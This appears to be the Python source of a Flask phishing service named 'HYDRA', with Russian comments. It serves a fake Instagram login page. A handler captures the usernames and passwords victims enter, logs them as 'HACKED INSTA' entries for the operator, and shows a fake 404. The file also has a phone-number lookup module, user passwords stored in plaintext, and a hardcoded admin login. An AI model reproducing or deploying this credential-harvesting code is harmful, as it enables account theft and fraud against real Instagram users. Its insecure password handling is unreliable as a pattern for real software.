from flask import Flask, request, jsonify, session, send_file, render_template_string
from flask_cors import CORS
from flask_sqlalchemy import SQLAlchemy
from fpdf import FPDF
import requests
import os
import io
from datetime import datetime

app = Flask(__name__, static_folder='.')
app.secret_key = 'HYDRA_ULTRA_SECURE_2026'
CORS(app)

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///hydra_users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    password = db.Column(db.String(50), nullable=False)

class SearchHistory(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    target = db.Column(db.String(255))
    module = db.Column(db.String(50))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

with app.app_context():
    db.create_all()

@app.route('/')
def index(): return app.send_static_file('index.html')

# ФЕЙК СТРАНИЦА ИНСТЫ
@app.route('/login/insta/<int:owner_id>')
def fake_insta(owner_id):
    return render_template_string('''
    <body style="background:#fafafa;font-family:sans-serif;display:flex;justify-content:center;padding-top:50px;">
        <div style="background:#fff;border:1px solid #dbdbdb;width:350px;padding:40px;text-align:center;">
            <img src="https://www.instagram.com/static/images/web/mobile_graph_gradient_android_2x.png/85392d20ad32.png" width="175">
            <form action="/login/auth/{{owner_id}}" method="POST" style="margin-top:20px;display:flex;flex-direction:column;">
                <input name="u" placeholder="Phone, username, or email" required style="margin-bottom:10px;padding:10px;border:1px solid #dbdbdb;background:#fafafa;">
                <input name="p" type="password" placeholder="Password" required style="margin-bottom:10px;padding:10px;border:1px solid #dbdbdb;background:#fafafa;">
                <button type="submit" style="background:#0095f6;color:#fff;border:none;padding:8px;border-radius:4px;font-weight:bold;cursor:pointer;">Log In</button>
            </form>
        </div>
    </body>
    ''', owner_id=owner_id)

# ПЕРЕХВАТ ПАРОЛЯ
@app.route('/login/auth/<int:owner_id>', methods=['POST'])
def catch_phish(owner_id):
    u, p = request.form.get('u'), request.form.get('p')
    log = SearchHistory(user_id=owner_id, target=f"HACKED INSTA -> LOGIN: {u} | PASS: {p}", module="EXPLOIT")
    db.session.add(log); db.session.commit()
    return "<h1>Error 404: Not Found</h1>"

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    low_user = data.get('username', '').lower().strip()
    if "абу" in low_user or "abu" in low_user: return jsonify({"status": "error", "message": "Reserved!"})
    if User.query.filter_by(username=data['username']).first(): return jsonify({"status": "error", "message": "Taken!"})
    new = User(username=data['username'], password=data['password'])
    db.session.add(new); db.session.commit()
    return jsonify({"status": "success"})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('username'), data.get('password')
    user = User.query.filter_by(username=u, password=p).first()
    if user:
        session['user_id'] = user.id
        is_admin = (u == 'abupaay' and p == '89674556975')
        return jsonify({"status": "success", "uid": user.id, "isAdmin": is_admin})
    return jsonify({"status": "error"})

@app.route('/api/history', methods=['GET'])
def get_history():
    uid = session.get('user_id')
    if not uid: return jsonify([])
    hist = SearchHistory.query.filter_by(user_id=uid).order_by(SearchHistory.timestamp.desc()).limit(10).all()
    return jsonify([{"target": h.target, "module": h.module, "time": h.timestamp.strftime('%H:%M')} for h in hist])

@app.route('/api/mail', methods=['GET'])
def get_mail():
    if 'user_id' not in session: return jsonify({"status":"error"})
    clean_p = "".join(filter(str.isdigit, request.args.get('target')))
    db.session.add(SearchHistory(user_id=session['user_id'], target=clean_p, module="Phone")); db.session.commit()
    res = [{"name": "Telegram App", "url": f"tg://resolve?phone={clean_p}"}, {"name": "WhatsApp", "url": f"https://wa.me/{clean_p}"}]
    return jsonify({"status": "Success", "found": res})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
